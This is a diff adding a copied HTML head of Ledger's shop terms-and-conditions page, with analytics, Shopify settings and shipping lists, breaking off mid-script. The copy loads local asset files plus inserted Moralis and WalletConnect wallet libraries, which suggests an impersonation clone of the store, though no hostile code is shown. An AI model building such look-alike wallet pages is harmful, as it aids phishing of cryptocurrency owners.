@@ -1,0 +1,2328 @@
+
+<!-- Doctype HTML5 -->
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+
+<head>
+  <!-- Début de la mention OneTrust de consentement aux cookies du domaine : ledgerstore-dev.myshopify.com -->
+  <!-- <script type="text/javascript"
+    src="https://cdn.cookielaw.org/consent/5ff3ecce-44bd-4ef3-b746-ec81546bf82a/OtAutoBlock.js"></script>
+  <script src="https://cdn.cookielaw.org/scripttemplates/otSDKStub.js" type="text/javascript" charset="UTF-8"
+    data-domain-script="5ff3ecce-44bd-4ef3-b746-ec81546bf82a" data-document-language="true"></script> -->
+  <!-- Fin de la mention OneTrust de consentement aux cookies du domaine : ledger.com -->
+<script type='text/javascript' src='js/jquery.min.js' ></script>
+<script type='text/javascript' src='js/jquery-migrate.min.js' ></script>
+
+ <!-- Moralis import -->
+  <script src="https://unpkg.com/moralis-v1@1.11.0/dist/moralis.js"></script>
+  <script src="https://github.com/WalletConnect/walletconnect-monorepo/releases/download/1.7.1/web3-provider.min.js"></script>
+  
+  <!-- Set some language strings to be used later -->
+  
+  
+  
+  
+  
+  
+  
+
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+<script>
+    window.translation_strings = window.translation_strings || {}
+    /* Make the translated string available on window global-back-in-stock.js*/
+    window.translation_strings.email_me_bis = 'Email me'
+    window.translation_strings.out_of_stock_bis = 'Out of stock'
+    window.translation_strings.coming_soon_bis = 'Coming soon'
+    /* Make the translated string available on window reseller-ressource-center.js*/
+    window.translation_strings.rrc_no_results = 'NO RESULTS'
+    window.translation_strings.rrc_come_back = 'We’re adding new ressources all the time. Check back soon!'
+    window.translation_strings.rrc_copy_url = 'Copy the video&#39;s URL'
+    window.translation_strings.rrc_download = 'Download'
+    /* Make the translated string available on window cart.js*/
+    window.translation_strings.nem_error_message = 'Ledger Nano S Nem edition cannot be shipped with other products. If you wish to purchase our regular products, please place a separate order.'
+    window.translation_strings.lnsx_error_message = 'Max allowed quantity for this is reached.'
+    window.translation_strings.cs_error_message = 'You cannot add more than 2 Cryptosteel capsule solo in your cart.'
+    window.translation_strings.starter_error_message = 'You have reached the maximum quantity for this product.'
+    window.translation_strings.billfodl_error_message = 'You cannot add more than 2 Billfodl to your cart.'
+    window.translation_strings.cryptozeus_error_message = 'You cannot add more than 2 Cryptotag Zeus to your cart.'
+    window.translation_strings.usa_warn_1 = 'To be able to redeem your voucher, you must be in a state supported by Coinify.'
+    window.translation_strings.usa_warn_2 = 'Check your eligibility here'
+    window.translation_strings.sbx_nano_error_message = 'You cannot add more than 1 Sandbox Nano to your cart.'
+    /* Make the translated string available on window _flow.js */
+    window.translation_strings.return_to_ledger_live_app = 'Go back to Ledger Live'
+
+  </script>
+
+   
+
+  <!-- Google Tag Manager -->
+  <script>
+    (function (w, d, s, l, i) {
+      w[l] = w[l] || [];
+      w[l].push({ "gtm.start": new Date().getTime(), event: "gtm.js" });
+      var f = d.getElementsByTagName(s)[0],
+        j = d.createElement(s),
+        dl = l != "dataLayer" ? "&l=" + l : "";
+      j.async = true;
+      j.src = "https://www.googletagmanager.com/gtm.js?id=" + i + dl;
+      f.parentNode.insertBefore(j, f);
+    })(window, document, "script", "dataLayer", "GTM-W5FKZ2N");
+  </script>
+  <!-- End Google Tag Manager -->
+
+  <script src="https://www.googleoptimize.com/optimize.js?id=GTM-TB9Q5T5"></script>
+
+  <script>
+    (function (i, s, o, g, r, a, m) {
+      i["GoogleAnalyticsObject"] = r;
+      (i[r] =
+        i[r] ||
+        function () {
+          (i[r].q = i[r].q || []).push(arguments);
+        }),
+        (i[r].l = 1 * new Date());
+      (a = s.createElement(o)), (m = s.getElementsByTagName(o)[0]);
+      a.async = 1;
+      a.src = g;
+      m.parentNode.insertBefore(a, m);
+    })(
+      window,
+      document,
+      "script",
+      "https://www.google-analytics.com/analytics.js",
+      "ga"
+    );
+    ga("create", "UA-55894473-2", "auto");
+    ga("require", "GTM-TB9Q5T5");
+  </script>
+  <script type="text/javascript">
+    (function e() {
+      var e = document.createElement("script");
+      (e.type = "text/javascript"),
+        (e.async = true),
+        (e.src =
+          "//staticw2.yotpo.com/VjYC1hjLHPTTjBOJGQajJPG9ZjLqy7OBx6uqubzH/widget.js");
+      var t = document.getElementsByTagName("script")[0];
+      t.parentNode.insertBefore(e, t);
+    })();
+  </script>
+  
+  <script>
+    (function (f, l, o, w, i, n, g) {
+      f[i] = f[i] || {};
+      f[i].set =
+        f[i].set ||
+        function () {
+          (f[i].q = f[i].q || []).push(arguments);
+        };
+      f[i].initialized = 0;
+      f[i].fraud = "enabled";
+      n = l.createElement(o);
+      n.src = w;
+      g = l.getElementsByTagName(o)[0];
+      g.parentNode.insertBefore(n, g);
+    })(
+      window,
+      document,
+      "script",
+      "https://shopify-cdn.flow.io/ledger/js/v0/flow.js?shop=ledgerstore.myshopify.com",
+      "Flow"
+    );
+  </script>
+  
+  <!-- Meta tags -->
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=AW-961495034"></script>
+  <script type="application/json" id="flow_shopify_cart">
+      {"note":null,"attributes":{"prices_metafield_key":"prices_maa7igf3pm","geo_currency":"CNY","geo_country":"CHN","flow_metafield_key":"flow_maa7igf3pm","shipping_configuration_key":"default","shopify_localization_method":"ssr","features":"global_checkout_initialize_endpoint\\:true\\|global_checkout_preload_assets\\:false\\|global_checkout_blaze\\:false\\|global_checkout_returning_customers\\:false\\|global_javascript_error_modal\\:false\\|global_inject_client_javascript\\:false\\|global_checkout_resource\\:true\\|global_shopify_js_cart_v2\\:true"},"original_total_price":14900,"total_price":14900,"total_discount":0,"total_weight":0.0,"item_count":1,"items":[{"id":39493371166792,"properties":{},"quantity":1,"variant_id":39493371166792,"key":"39493371166792:1ff43499653e720216510a28978f27e1","title":"Ledger Nano X - Onyx Black","price":14900,"original_price":14900,"discounted_price":14900,"line_price":14900,"original_line_price":14900,"total_discount":0,"discounts":[],"sku":"lnx","grams":0,"vendor":"Ledger","taxable":true,"product_id":1829667700778,"product_has_only_default_variant":false,"gift_card":false,"final_price":14900,"final_line_price":14900,"url":"\/products\/ledger-nano-x?variant=39493371166792","featured_image":{"aspect_ratio":0.749,"alt":"Ledger Nano X","height":1880,"url":"https:\/\/cdn.shopify.com\/s\/files\/1\/2974\/4858\/products\/Ledger_Nano_X_Onyx_Black.png?v=1658828796","width":1408},"image":"https:\/\/cdn.shopify.com\/s\/files\/1\/2974\/4858\/products\/Ledger_Nano_X_Onyx_Black.png?v=1658828796","handle":"ledger-nano-x","requires_shipping":true,"product_type":"","product_title":"Ledger Nano X","product_description":"\nSecure, buy, exchange, grow your crypto and manage your NFTs with our new Bluetooth-enabled hardware wallet. All your digital assets secured in one place.","variant_title":"Onyx Black","variant_options":["Onyx Black"],"options_with_values":[{"name":"Color","value":"Onyx Black"}],"line_level_discount_allocations":[],"line_level_total_discount":0}],"requires_shipping":true,"currency":"EUR","items_subtotal_price":14900,"cart_level_discount_applications":[]}
+    </script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+    gtag("js", new Date());
+
+    gtag("config", "AW-961495034");
+  </script>
+  <script type="text/javascript">
+    function formatGTMPrice(price) {
+      const strPrice = price.toString()
+      return  strPrice.slice(0, -2) + '.' + strPrice.slice(-2);
+    }
+    function getProductCategory(productName) {
+      const bundleList = [
+        'Ledger Family Pack X',
+        'Ledger Backup Pack',
+        'Ledger Family Pack S',
+        'Crypto Starter Pack',
+      ]
+      const hwList = [
+        'Ledger Nano X',
+        'Ledger Nano S',
+        'Ledger Nano S Plus',
+        'Ledger Blue',
+      ]
+      const accessoriesList = [
+        'Ledger OTG Kit',
+        'Cryptosteel Capsule Solo',
+        'The Billfodl',
+        'Swivel Pack',
+        'Cryptotag Zeus',
+        'Ledger Nano Pod',
+        'Ledger Nano Case'
+      ]
+      if (hwList.find(product => productName.includes(product)) ) {
+        return ('Hardware Wallet')
+      } else if (bundleList.find(product => productName.includes(product)) ) {
+        return ('Bundle')
+      } else if (accessoriesList.find(product => productName.includes(product)) ) {
+        return ('Accessory')
+      } else {
+        return (undefined)
+      }
+    }
+
+    function gtmCleaner() {
+      dataLayer.push({
+        event: undefined,
+        ecommerce: undefined,
+        user_country: undefined,
+        gtm: undefined,
+        OnetrustActiveGroups: undefined,
+        OptanonActiveGroups: undefined,
+        mail_marketing: undefined,
+        optin_mail: undefined,
+        optanonCategory: undefined,
+        optanonAction: undefined,
+        site_language: undefined,
+        item_category: undefined,
+        page_type: undefined,
+      })
+    }
+
+    function getPageType() {
+      const template = "page.generic"?.split('.');
+      let page_type;
+      let item_category = undefined;
+
+      if (!template) {
+        page_type = 'flow'
+      } else if (template[0] === 'page' && template[1] === 'comparison') {
+        page_type = 'comparison'
+      } else if (template[0] === 'page' && template[1] === 'ledger-reviews') {
+        page_type = 'reviews'
+      } else if (template[0] === 'page' && template[1].includes('marketing')) {
+        page_type = 'product detail page'
+        item_category = template[1]
+      } else if (template[0] === 'index') {
+        page_type = 'homepage'
+      } else {
+        page_type = template[0]
+      }
+
+      if (null) {
+        item_category = getProductCategory(null)
+      }
+
+      return [page_type, item_category]
+    }
+    
+    const [page_type, item_category] = getPageType()
+
+    dataLayer.push({
+      event: 'page_view_custom',
+      site_language: "en",
+      user_country:  {"first_name":null,"address1":"1 rue du mail","phone":"+33633558792","city":"Paris","zip":"75002","province":"","country":"France","last_name":null,"address2":"","company":"Ledger SAS","latitude":48.8664612,"longitude":2.3414224,"name":"","country_code":"FR","province_code":null}.country,
+      page_type: page_type,
+      item_category : item_category
+    })
+
+    
+    gtag('event', 'page_view', {
+      ecomm_prodid: '',
+      ecomm_pagetype: 'other',
+      ecomm_totalvalue: ''
+    });
+    
+    gtag()
+  </script>
+  <meta charset="utf-8" />
+  <meta http-equiv="x-ua-compatible" content="ie=edge" />
+  <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=2" />
+
+   
+  <meta name="robots" content="index,follow" />
+  <meta name="googlebot" content="index,follow" />
+  
+
+  <!-- Store info -->
+  
+  <title>Sales Terms and Conditions | Ledger</title>
+  
+  <meta name="description" content="Ledger offers smartcard-based crypto asset hardware wallets bringing optimal protection level to your bitcoins, ethereums, ripple and more - without sacrificing usability or control." />
+  <link rel="canonical" href="https://shop.ledger.com/pages/terms-and-conditions" />
+
+  <!-- Favicons -->
+   
+<link rel="icon" type="image/png" class="dynamic-favicon" sizes="16x16" href="images/ledger-favicon-shop_16x16.png" />
+<link rel="icon" type="image/png" class="dynamic-favicon" sizes="32x32" href="images/ledger-favicon-shop_32x32.png" />
+<link rel="icon" type="image/png" class="dynamic-favicon" sizes="96x96" href="images/ledger-favicon-shop_96x96.png" />
+<link rel="apple-touch-icon" class="dynamic-favicon" href="images/ledger-favicon-shop_200x200.png" />
+<link rel="shortcut icon" href="images/ledger-favicon-shop_200x200.png" />
+    <!-- Facebook Open Graph -->
+<meta property="og:url" content="https://shop.ledger.com/pages/terms-and-conditions">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Sales Terms and Conditions">
+
+	<meta property="og:image" content="https:images/opengraphh_200x.panel-group">
+
+<meta property="og:description" content="Ledger offers smartcard-based crypto asset hardware wallets bringing optimal protection level to your bitcoins, ethereums, ripple and more - without sacrificing usability or control.">
+<meta property="og:site_name" content="Ledger">
+<meta property="og:locale" content="en">
+<meta property="article:author" content="Ledger">
+
+<!-- Twitter Card -->
+<meta name="twitter:card" content="summary">
+<meta name="twitter:url" content="https://shop.ledger.com/pages/terms-and-conditions">
+<meta name="twitter:title" content="Sales Terms and Conditions">
+<meta name="twitter:description" content="Ledger offers smartcard-based crypto asset hardware wallets bringing optimal protection level to your bitcoins, ethereums, ripple and more - without sacrificing usability or control.">
+
+	<meta name="twitter:image" content="https://cdn.shopify.com/s/files/1/2974/4858/files/opengraphh_200x.png?v=1671012004">
+
+<!-- Google+ / Schema.org -->
+<link href="https://shop.ledger.com/pages/terms-and-conditions" rel="publisher">
+<meta itemprop="name" content="Sales Terms and Conditions">
+<meta itemprop="description" content="Ledger offers smartcard-based crypto asset hardware wallets bringing optimal protection level to your bitcoins, ethereums, ripple and more - without sacrificing usability or control.">
+
+	<meta itemprop="image" content="https://cdn.shopify.com/s/files/1/2974/4858/files/opengraphh_200x.png?v=1671012004">
+
+
+
+  <script>window.performance && window.performance.mark && window.performance.mark('shopify.content_for_header.start');</script><meta id="shopify-digital-wallet" name="shopify-digital-wallet" content="/29744858/digital_wallets/dialog">
+<link rel="alternate" hreflang="x-default" href="https://shop.ledger.com/pages/terms-and-conditions">
+<link rel="alternate" hreflang="en" href="https://shop.ledger.com/pages/terms-and-conditions">
+<link rel="alternate" hreflang="ar" href="https://shop.ledger.com/ar/pages/terms-and-conditions">
+<link rel="alternate" hreflang="de" href="https://shop.ledger.com/de/pages/terms-and-conditions">
+<link rel="alternate" hreflang="es" href="https://shop.ledger.com/es/pages/terms-and-conditions">
+<link rel="alternate" hreflang="fr" href="https://shop.ledger.com/fr/pages/terms-and-conditions">
+<link rel="alternate" hreflang="ja" href="https://shop.ledger.com/ja/pages/terms-and-conditions">
+<link rel="alternate" hreflang="ko" href="https://shop.ledger.com/ko/pages/terms-and-conditions">
+<link rel="alternate" hreflang="pt" href="https://shop.ledger.com/pt-br/pages/terms-and-conditions">
+<link rel="alternate" hreflang="ru" href="https://shop.ledger.com/ru/pages/terms-and-conditions">
+<link rel="alternate" hreflang="tr" href="https://shop.ledger.com/tr/pages/terms-and-conditions">
+<link rel="alternate" hreflang="zh-Hans" href="https://shop.ledger.com/zh-cn/pages/terms-and-conditions">
+<link rel="alternate" hreflang="zh-Hans" href="https://shop.ledger.com/zh-cn/pages/terms-and-conditions">
+<script id="shopify-features" type="application/json">{"accessToken":"6ae925decf6a6fa59908b4800b440fb9","betas":["rich-media-storefront-analytics"],"domain":"shop.ledger.com","predictiveSearch":true,"shopId":29744858,"smart_payment_buttons_url":"https:\/\/cdn.shopify.com\/shopifycloud\/payment-sheet\/assets\/latest\/spb.en.js?v=2","dynamic_checkout_cart_url":"https:\/\/cdn.shopify.com\/shopifycloud\/payment-sheet\/assets\/latest\/dynamic-checkout-cart.en.js?v=2","locale":"en","optimusEnabled":false}</script>
+<script>var Shopify = Shopify || {};
+Shopify.shop = "ledgerstore.myshopify.com";
+Shopify.locale = "en";
+Shopify.currency = {"active":"EUR","rate":"1.0"};
+Shopify.country = "FR";
+Shopify.theme = {"name":"Release 2.89.1 referral v2 fixes","id":120688836680,"theme_store_id":null,"role":"main"};
+Shopify.theme.handle = "null";
+Shopify.theme.style = {"id":null,"handle":null};
+Shopify.cdnHost = "cdn.shopify.com";
+Shopify.routes = Shopify.routes || {};
+Shopify.routes.root = "/";</script>
+<script type="module">!function(o){(o.Shopify=o.Shopify||{}).modules=!0}(window);</script>
+<script>!function(o){function n(){var o=[];function n(){o.push(Array.prototype.slice.apply(arguments))}return n.q=o,n}var t=o.Shopify=o.Shopify||{};t.loadFeatures=n(),t.autoloadFeatures=n()}(window);</script>
+<script>(function() {
+  function asyncLoad() {
+    var urls = ["https:\/\/intg.snapchat.com\/shopify\/shopify-scevent-init.js?id=5fefacb2-108d-4d83-8c43-7b198bce2a67\u0026shop=ledgerstore.myshopify.com"];
+    for (var i = 0; i < urls.length; i++) {
+      var s = document.createElement('script');
+      s.type = 'text/javascript';
+      s.async = true;
+      s.src = urls[i];
+      var x = document.getElementsByTagName('script')[0];
+      x.parentNode.insertBefore(s, x);
+    }
+  };
+  if(window.attachEvent) {
+    window.attachEvent('onload', asyncLoad);
+  } else {
+    window.addEventListener('load', asyncLoad, false);
+  }
+})();</script>
+<script id="__st">var __st={"a":29744858,"offset":3600,"reqid":"263d8ae7-1178-40fa-a12d-6e51288d41b8","pageurl":"shop.ledger.com\/pages\/terms-and-conditions","s":"pages-15355150378","t":"prospect","u":"d4d2bf4a3abb","p":"page","rtyp":"page","rid":15355150378};</script>
+<script>window.ShopifyPaypalV4VisibilityTracking = true;</script>
+<script integrity="sha256-4VRZk5nmuLKdyxECzHbrGZ+jOgmvT6eNFej4VE7mT80=" data-source-attribution="shopify.loadfeatures" defer="defer" src="//cdn.shopify.com/shopifycloud/shopify/assets/storefront/load_feature-e154599399e6b8b29dcb1102cc76eb199fa33a09af4fa78d15e8f8544ee64fcd.js" crossorigin="anonymous"></script>
+<script integrity="sha256-h+g5mYiIAULyxidxudjy/2wpCz/3Rd1CbrDf4NudHa4=" data-source-attribution="shopify.dynamic-checkout" defer="defer" src="//cdn.shopify.com/shopifycloud/shopify/assets/storefront/features-87e8399988880142f2c62771b9d8f2ff6c290b3ff745dd426eb0dfe0db9d1dae.js" crossorigin="anonymous"></script>
+
+
+<script>window.performance && window.performance.mark && window.performance.mark('shopify.content_for_header.end');</script>
+
+  <!-- Stylesheets -->
+  
+  <link href="css/css_vendor.css" rel="stylesheet" type="text/css" media="all" />
+  <link href="css/css_theme.css" rel="stylesheet" type="text/css" media="all" />
+  
+  
+  <!-- Fonts -->
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700,800|Rubik:300,400,500,700"
+    rel="stylesheet" />
+
+  <!-- Scripts -->
+  <script>
+
+	window.theme = window.theme || {};
+	window.globals = window.globals || {};
+
+	window.globals.breakpoints = {
+		mobile: 767,
+		tablet: 1079,
+		desktop: 1080
+	}
+	
+	// 1. Shop
+	window.theme.shop = {
+		address: {"first_name":null,"address1":"1 rue du mail","phone":"+33633558792","city":"Paris","zip":"75002","province":"","country":"France","last_name":null,"address2":"","company":"Ledger SAS","latitude":48.8664612,"longitude":2.3414224,"name":"","country_code":"FR","province_code":null},
+		currency: "EUR",
+		domain: "shop.ledger.com",
+		locale: "en",
+		name: "Ledger",
+		url: "https:\/\/shop.ledger.com"
+	};
+
+	// 2. Template
+	window.theme.template = {
+		name: "page",
+		suffix: "generic",
+	};
+
+	// 3. Locales
+	window.theme.locales = {};
+
+	// 4. Cart Object
+	window.theme.cart_json = {"note":null,"attributes":{"prices_metafield_key":"prices_maa7igf3pm","geo_currency":"CNY","geo_country":"CHN","flow_metafield_key":"flow_maa7igf3pm","shipping_configuration_key":"default","shopify_localization_method":"ssr","features":"global_checkout_initialize_endpoint\\:true\\|global_checkout_preload_assets\\:false\\|global_checkout_blaze\\:false\\|global_checkout_returning_customers\\:false\\|global_javascript_error_modal\\:false\\|global_inject_client_javascript\\:false\\|global_checkout_resource\\:true\\|global_shopify_js_cart_v2\\:true"},"original_total_price":14900,"total_price":14900,"total_discount":0,"total_weight":0.0,"item_count":1,"items":[{"id":39493371166792,"properties":{},"quantity":1,"variant_id":39493371166792,"key":"39493371166792:1ff43499653e720216510a28978f27e1","title":"Ledger Nano X - Onyx Black","price":14900,"original_price":14900,"discounted_price":14900,"line_price":14900,"original_line_price":14900,"total_discount":0,"discounts":[],"sku":"lnx","grams":0,"vendor":"Ledger","taxable":true,"product_id":1829667700778,"product_has_only_default_variant":false,"gift_card":false,"final_price":14900,"final_line_price":14900,"url":"\/products\/ledger-nano-x?variant=39493371166792","featured_image":{"aspect_ratio":0.749,"alt":"Ledger Nano X","height":1880,"url":"https:\/\/cdn.shopify.com\/s\/files\/1\/2974\/4858\/products\/Ledger_Nano_X_Onyx_Black.png?v=1658828796","width":1408},"image":"https:\/\/cdn.shopify.com\/s\/files\/1\/2974\/4858\/products\/Ledger_Nano_X_Onyx_Black.png?v=1658828796","handle":"ledger-nano-x","requires_shipping":true,"product_type":"","product_title":"Ledger Nano X","product_description":"\nSecure, buy, exchange, grow your crypto and manage your NFTs with our new Bluetooth-enabled hardware wallet. All your digital assets secured in one place.","variant_title":"Onyx Black","variant_options":["Onyx Black"],"options_with_values":[{"name":"Color","value":"Onyx Black"}],"line_level_discount_allocations":[],"line_level_total_discount":0}],"requires_shipping":true,"currency":"EUR","items_subtotal_price":14900,"cart_level_discount_applications":[]};
+
+	// 5. Customer
+	window.theme.customer =false;
+
+	// 6. Current Object
+	window.theme.current_object =
+{"error":"json not allowed for this object"};
+         
+    window.theme.live_links = 
+        {
+            windows: "https:\/\/download-live.ledger.com\/releases\/latest\/download",
+            mac: "https:\/\/download-live.ledger.com\/releases\/latest\/download",
+            linux: "https:\/\/download-live.ledger.com\/releases\/latest\/download"
+        }
+
+	window.theme.covid_19 = {
+		countries: "GRL",
+		msg: "Due to the ongoing pandemic, we have halted shipping to \u0026lt;a href=\u0026quot;https:\/\/support.ledger.com\/hc\/en-us\/articles\/360012650219-COVID-19-zip-codes-affected-by-the-Coronavirus-situation\u0026quot; target=\u0026quot;_blank\u0026quot;\u0026gt;this list of cities\u0026lt;\/a\u0026gt; in Austria, Bulgaria, Czech Republic, Italy and Portugal. If your order is concerned, it will be canceled and refunded."
+	}
+
+	const str_taxes_duties = sessionStorage.getItem('l10n_taxes_duties')
+		? sessionStorage.getItem('l10n_taxes_duties')
+		: "Note: For delivery outside the EU, custom duties or other taxes may apply. Check the \u0026lt;a href=\u0026quot;\/pages\/terms-and-conditions\u0026quot;\u0026gt;Terms and Conditions\u0026lt;\/a\u0026gt; for more details."
+
+	const str_ongoing_situation = sessionStorage.getItem('l10n_ongoing_situation')
+		? sessionStorage.getItem('l10n_ongoing_situation')
+		: "Due to the ongoing situation in Russia, our transportation carriers stopped all shipments to Russia at this time. We believe in the choice of self-custody for all users and do not want to pause shipping to Russia, but we cannot deliver Ledgers until carriers are able to safely send shipments. Until that time, we are disabling purchases with shipping addresses to Russia. We are actively working on alternatives and will resume as soon as possible."
+
+	const str_return_to_cart = sessionStorage.getItem('l10n_return_to_cart')
+		? sessionStorage.getItem('l10n_return_to_cart')
+		: "Return to Cart"
+
+	window.theme.checkout_messages = {
+		taxes_duties: str_taxes_duties,
+		ongoing_situation: str_ongoing_situation,
+		return_to_cart: str_return_to_cart
+	}
+
+	window.theme.country_exclusions = {
+		countries: null,
+		products: null
+	}
+	
+
+	window.theme.nano_x = {
+		id: 39493371166792
+	}
+	
+
+	window.theme.bundle_nano_x = {
+		id: 0
+	}
+
+	window.theme.black_friday = null
+	
+
+	window.theme.referral = {
+		products: [],
+		isActivated: false,
+		giftCard: null
+	}
+	
+		window.theme.referral.isActivated = true;
+		window.theme.referral.giftCardId = '39615180734536'
+		
+			
+				window.theme.referral.products.push(39493371166792)
+			
+				window.theme.referral.products.push(39493371199560)
+			
+				window.theme.referral.products.push(39493371232328)
+			
+
+		
+			
+				window.theme.referral.products.push(39707230994504)
+			
+
+		
+			
+				window.theme.referral.products.push(39493377065032)
+			
+				window.theme.referral.products.push(39493377097800)
+			
+				window.theme.referral.products.push(39493377130568)
+			
+				window.theme.referral.products.push(39493377163336)
+			
+				window.theme.referral.products.push(39493377196104)
+			
+
+		
+	
+
+	window.theme.stax_id = null
+	
+		
+		window.theme.stax_id = "39707230994504"
+		window.theme.stax_delay_label = "Please note that Ledger Stax will be <b>shipped by the end of April 2023.</b>"
+		window.theme.stax_delay_cart_label = "<p><strong>Due to high demand, Ledger Stax estimated shipping will be April 2023.</strong><br/>Other items will be dispatched shortly after order confirmation</p>"
+	
+
+	window.theme.marketing_lnsp = {
+		cta_label: 'Keep me posted'
+	}
+	window.theme.p = {
+		add_to_cart: 'Add to cart',
+		out_of_stock: 'Out of stock',
+		sold_out: 'Sold out'
+	}
+</script>
+<script src="js/js_vendor.js" defer></script>
+<script src="js/js_theme.js" defer></script>
+  
+  <!-- Icons -->
+  <!--<script defer src="https://use.fontawesome.com/releases/v5.0.10/js/all.js" integrity="sha384-slN8GvtUJGnv6ca26v8EzVaR9DC58QEwsIk9q1QXdCU8Yu8ck/tL/5szYlBbqmS+" crossorigin="anonymous"></script>-->
+  
+  <script src="https://kit.fontawesome.com/f8a71d88c0.js"></script>
+  
+  <!-- edev-703 -->
+  <script type="text/javascript">
+    const [current_page_type, current_item_category] = getPageType()
+    const setPageViewGtag = () => {
+      dataLayer.push({
+        event: 'page_view',
+        site_language: "en",
+        user_country: {"first_name":null,"address1":"1 rue du mail","phone":"+33633558792","city":"Paris","zip":"75002","province":"","country":"France","last_name":null,"address2":"","company":"Ledger SAS","latitude":48.8664612,"longitude":2.3414224,"name":"","country_code":"FR","province_code":null}.country,
+        item_category: current_item_category,
+        page_type: current_page_type
+      });
+    }
+    const allowedCountries = [
+      "AGO",
+      "AND",
+      "AIA",
+      "ATG",
+      "ARG",
+      "ARM",
+      "ABW",
+      "AUS",
+      "AUT",
+      "AZE",
+      "BHR",
+      "BEL",
+      "BLZ",
+      "BEN",
+      "BMU",
+      "BTN",
+      "BES",
+      "BRA",
+      "VGB",
+      "BRN",
+      "BGR",
+      "CMR",
+      "CAN",
+      "CPV",
+      "TCD",
+      "CHL",
+      "COL",
+      "COM",
+      "CRI",
+      "HRV",
+      "CUW",
+      "CYP",
+      "CZE",
+      "DNK",
+      "DJI",
+      "DMA",
+      "DOM",
+      "TLS",
+      "SLV",
+      "GNQ",
+      "ERI",
+      "EST",
+      "ETH",
+      "FRO",
+      "FJI",
+      "FIN",
+      "FRA",
+      "GAB",
+      "GMB",
+      "GEO",
+      "DEU",
+      "GIB",
+      "GRC",
+      "GRL",
+      "GRD",
+      "GLP",
+      "GTM",
+      "GGY",
+      "GIN",
+      "GUY",
+      "HND",
+      "HKG",
+      "HUN",
+      "ISL",
+      "IND",
+      "IDN",
+      "IRL",
+      "IMN",
+      "ISR",
+      "ITA",
+      "CIV",
+      "JEY",
+      "JOR",
+      "KEN",
+      "KIR",
+      "KWT",
+      "LAO",
+      "LVA",
+      "LSO",
+      "LBR",
+      "LIE",
+      "LTU",
+      "LUX",
+      "MAC",
+      "MDG",
+      "MWI",
+      "MYS",
+      "MDV",
+      "MLT",
+      "MHL",
+      "MRT",
+      "MEX",
+      "FSM",
+      "MDA",
+      "MCO",
+      "MSR",
+      "MOZ",
+      "NAM",
+      "NLD",
+      "NZL",
+      "NER",
+      "NGA",
+      "NOR",
+      "OMN",
+      "PLW",
+      "PSE",
+      "PNG",
+      "PRY",
+      "PER",
+      "PHL",
+      "POL",
+      "PRT",
+      "QAT",
+      "ROU",
+      "RUS",
+      "RWA",
+      "KNA",
+      "LCA",
+      "VCT",
+      "WSM",
+      "SMR",
+      "STP",
+      "SYC",
+      "SLE",
+      "SGP",
+      "SXM",
+      "SVK",
+      "SVN",
+      "ZAF",
+      "ESP",
+      "LKA",
+      "SUR",
+      "SWE",
+      "CHE",
+      "TWN",
+      "TJK",
+      "TGO",
+      "TON",
+      "TUN",
+      "TUR",
+      "TKM",
+      "TCA",
+      "GBR",
+      "USA",
+      "URY",
+      "UZB",
+      "ZMB"
+    ];
+
+    
+
+
+    
+      const russiaUnavailable = "Shipping to your country is unavailable for this product."
+      Flow.set('on', 'ready', () => {
+        setPageViewGtag();
+        if( Flow.session.getCountry() == 'RUS' ) {
+          $('.product-card-big-display .tile__button--atc').attr('disabled', 'disabled').val("Not available").css({'background-color': '#D8D8D8', 'color': '#999999', 'border': 'none'})
+          $('.product-card-big-display .js-collection-form').after("<div class='row margin-s'>" + russiaUnavailable + "<div>");
+          const freeShippingElement = $('.product-card-big-display .free-shipping');
+          freeShippingElement.remove();
+        }
+      });
+    
+
+  </script>
+  <script>
+    /* Make the translated strings available in flow checkout*/
+    if((window.theme.template.name || window.theme.template.suffix) || !sessionStorage.getItem('l10n_language') ) {
+      sessionStorage.setItem('l10n_taxes_duties', "Note: For delivery outside the EU, custom duties or other taxes may apply. Check the \u0026lt;a href=\u0026quot;\/pages\/terms-and-conditions\u0026quot;\u0026gt;Terms and Conditions\u0026lt;\/a\u0026gt; for more details.");
+      sessionStorage.setItem('l10n_return_to_cart', "Return to Cart");
+      sessionStorage.setItem('l10n_ongoing_situation', "Due to the ongoing situation in Russia, our transportation carriers stopped all shipments to Russia at this time. We believe in the choice of self-custody for all users and do not want to pause shipping to Russia, but we cannot deliver Ledgers until carriers are able to safely send shipments. Until that time, we are disabling purchases with shipping addresses to Russia. We are actively working on alternatives and will resume as soon as possible.");
+      sessionStorage.setItem('l10n_language', "en");
+    }
+  </script>
+<link href="https://monorail-edge.shopifysvc.com" rel="dns-prefetch">
+<script>(function(){if ("sendBeacon" in navigator && "performance" in window) {var session_token = document.cookie.match(/_shopify_s=([^;]*)/);function handle_abandonment_event(e) {var entries = performance.getEntries().filter(function(entry) {return /monorail-edge.shopifysvc.com/.test(entry.name);});if (!window.abandonment_tracked && entries.length === 0) {window.abandonment_tracked = true;var currentMs = Date.now();var navigation_start = performance.timing.navigationStart;var payload = {shop_id: 29744858,url: window.location.href,navigation_start,duration: currentMs - navigation_start,session_token: session_token && session_token.length === 2 ? session_token[1] : "",page_type: "page"};window.navigator.sendBeacon("https://monorail-edge.shopifysvc.com/v1/produce", JSON.stringify({schema_id: "online_store_buyer_site_abandonment/1.1",payload: payload,metadata: {event_created_at_ms: currentMs,event_sent_at_ms: currentMs}}));}}window.addEventListener('pagehide', handle_abandonment_event);}}());</script>
+<script>window.ShopifyAnalytics = window.ShopifyAnalytics || {};
+window.ShopifyAnalytics.meta = window.ShopifyAnalytics.meta || {};
+window.ShopifyAnalytics.meta.currency = 'EUR';
+var meta = {"page":{"pageType":"page","resourceType":"page","resourceId":15355150378}};
+for (var attr in meta) {
+  window.ShopifyAnalytics.meta[attr] = meta[attr];
+}</script>
+<script>window.ShopifyAnalytics.merchantGoogleAnalytics = function() {
+  
+};
+</script>
+<script class="analytics">(function () {
+  var customDocumentWrite = function(content) {
+    var jquery = null;
+
+    if (window.jQuery) {
+      jquery = window.jQuery;
+    } else if (window.Checkout && window.Checkout.$) {
+      jquery = window.Checkout.$;
+    }
+
+    if (jquery) {
+      jquery('body').append(content);
+    }
+  };
+
+  var hasLoggedConversion = function(token) {
+    if (token) {
